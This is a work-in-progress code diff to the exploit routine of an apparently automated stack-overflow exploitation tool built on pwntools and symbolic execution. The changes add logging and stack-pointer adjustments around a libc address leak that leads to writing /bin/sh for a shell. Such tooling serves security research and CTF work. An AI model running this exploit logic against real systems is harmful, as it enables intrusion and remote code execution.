@@ -1,6 +1,7 @@
 import smrop
 import logging
 import json
+import time
 
 import pwn
 
@@ -137,6 +138,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
     # TODO: gate on detect
     def exploit(self, conn):
         sconn = conn.conn
+        logger.info(sconn)
         function_addr = int(self.function["address"], 16) 
         target_func = int(self.targetFunc["address"], 16)
         func_exit = int(self.functionExit, 16)
@@ -164,15 +166,14 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
         # read libc location
         logger.info("Sending first payload (to leak 'gets' location)")
-        rsp =conn.model.state.regs.rsp           
-        for i in range(8):
-                return_addr = conn.model.state.memory.load(rsp+8*i, 8)
-                #print(conn.model.state.callstack)
-                print(return_addr)
-        print(conn.model.state.callstack)
-        print(return_addr)
-        
+        logger.info(f"{conn.conn}")
+        logger.info(f"{sconn}")
+      
+        print(payload1) 
+        #time.sleep(.1)
+        #conn.conn.send(payload1) 
         conn.model.sendline(payload1)
+        print("model callstack after", conn.model.state.callstack)
 
         # Need to perform drain of non libc stuff
         if self.suffix:
@@ -182,32 +183,56 @@ class StackBufferOverflowVulnerability(Vulnerability):
         else:
             logger.info("Navigating to function exit")
             conn.navigate(func_exit)
-            conn.model.simgr.step()
-            print(conn.model.simgr.active)
-            rsp =conn.model.state.regs.rsp
-            print(conn.model.state.posix.dumps(0))
-            for i in range(12):
-                return_addr = conn.model.state.memory.load(rsp-64+8*i, 8)
-                #print(conn.model.state.callstack)
-                print(return_addr)
-            raise("Sad")
+            print("After navigating to func_exit:", conn.model.simgr.active)
+        logger.info(f"{conn.conn}")
+        logger.info(f"{sconn}")
         
         # Alright! We've navigated to the function exit!
-        # Unfortunately, we're now in a pickle.
+        # Unfortunately, we're now in a pickle. The model
+        # will now drift from the actual output.
 
+        # fake calling puts
+        logger.info(f"After navigating to func_exit and before stepping: {conn.model.simgr.active}")
+        rsp = conn.model.state.regs.rsp 
+        conn.model.state.regs.rsp = rsp
+        for i in range(16):
+            return_addr = conn.model.state.memory.load(rsp - 8*i , 8)
+            logger.info(f"After navigating to func_exit and before stepping [return]: {return_addr}")
+        rsp = conn.model.state.regs.rsp + 8
+        conn.model.state.regs.rsp = rsp
+        conn.model.simgr.active.clear()
+        conn.model.simgr.active.append(conn.model.state)
+
+        logger.info(f"Rsp is {rsp}")
+        # TODO: simulate output
+        logger.info(f"{conn.model.simgr.active[0].callstack}")
+        conn.model.simgr.step()
+        logger.info(f"After navigating to func_exit and stepping: {conn.model.simgr.active} {conn.model.simgr}")
+        logger.info(f"{conn.model.simgr.active[0].callstack}")
+
+        logger.info(f"After navigating to func_exit and stepping: {conn.model.simgr.active}")
+        print("Value of stdin after stepping", conn.model.state.posix.dumps(0))
+        print("Value of rsp after stepping", rsp)
+
+        # TODO: The model doesn't see this
         # We've hit the return, next output is now the 'gets' address
+        #time.sleep(.1)
+        sconn.sendline(payload1) 
         gets_location = sconn.recvline()[:-1]
         logger.debug(f"gets_location: {gets_location}")
         gets_location = int.from_bytes(gets_location, byteorder='little')
         libcoffset = gets_location - self.libc.symbols["gets"]
         logger.info("Libc found at {}".format(hex(libcoffset)))
+        
+        # Alright! The model is mostly in the same state as the connection
+        # again.
 
         # need to navigate back to the targetFunc
         if self.initial:
             logger.info("Using provided intial value to clear stdout")
             sconn.recvuntil(self.initial)
         else:
-            logger.info("Navigating to targetFunc.")
+            logger.info(f"Navigating to targetFunc from {conn.model.simgr.active}")
             conn.navigate(target_func)
 
         # send /bin/sh
@@ -231,6 +256,12 @@ class StackBufferOverflowVulnerability(Vulnerability):
         else:
             logger.info("Navigating to function exit")
             conn.navigate(func_exit)
+
+        # fake calling puts
+        rsp = conn.model.state.regs.rsp + 16
+        conn.model.state.regs.rsp = rsp
+        # TODO: simulate output
+        conn.model.simgr.step()
 
         # we have exited the function, we can now
         # write /bin/sh to a controlled part of memory
